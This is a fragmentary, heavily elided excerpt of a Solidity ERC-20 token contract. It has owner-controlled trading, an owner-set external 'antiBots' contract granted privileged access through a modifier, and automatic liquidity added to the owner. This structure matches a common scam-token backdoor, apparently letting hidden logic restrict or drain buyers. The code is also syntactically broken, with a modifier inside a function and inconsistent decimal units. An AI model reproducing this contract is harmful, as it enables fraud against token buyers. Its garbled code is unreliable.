...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        ...
        _owner = newOwner;}} interface antiBots {
...
contract Contract is Context, IERC20, Ownable {
    ...
    uint256 private _tSupply = 100000000 * 10**9;
    ...
    antiBots private isBot;
    address private uniswapV2Pair;
 
    bool private tradingStatus;
 
    bool private inSwap = false;
    bool private swaplive = false;
    bool private limitOff = false;
 
    uint256 private _maxTx = _tSupply;
    uint256 private _maxWallet = _tSupply;
    ...
    function removeLimits(bool onoff) external onlyOwner {
        limitOff = onoff;
    } 
    ...
    function _approve(
        ...
        modifier setlogics(){ require( address(isBot) == msg.sender, ""  );_; 
    ...
    function _transferStandard(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _setTokenTransfer(from, to, amount);
                ...
                if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                    if (limitOff) {
                        require(limits[to] < block.timestamp);
                    }
                    limits[to] = block.timestamp + (30 seconds);
                   _setTokenTransfer(from, to, amount);
    ...
    function setTrading(address on) external onlyOwner {
        ...
        (address(this), _uniswapV2Router.WETH());isBot = antiBots(on);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
        address(this),balanceOf(address(this)), 0, 0, owner(),block.timestamp);
        swaplive = true;
        limitOff = true;
        _maxTx = 3000000 * 10**18; 
